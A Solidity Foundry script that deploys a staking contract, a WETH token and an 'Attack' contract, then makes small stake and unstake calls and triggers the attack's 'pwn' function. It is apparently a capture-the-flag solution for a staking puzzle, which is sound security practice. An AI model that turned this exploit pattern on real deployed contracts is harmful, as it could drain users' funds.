// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Stake, Attack, WETH} from "../src/Stake.sol";


contract StakeScript is Script {
    Stake public stakeContract;
    Attack public attack;
    WETH public weth;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        weth = new WETH();
        stakeContract = new Stake(address(weth));
        attack = new Attack(weth, stakeContract);
        
        // stakeContract = new Stake(address(attack));
        // stakeContract = Stake(0x17e6a22412CC753F9B8c1FF92fBA0f2bcc2B86FD);

        // stakeContract.StakeWETH(10 ether); 
        address(stakeContract).call{value: 0.001 ether + 1}(abi.encodeWithSignature("StakeETH()"));
        address(stakeContract).call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether + 1));


        attack.pwn{value: 0.001 ether + 2}(); 


        vm.stopBroadcast();
    }
}
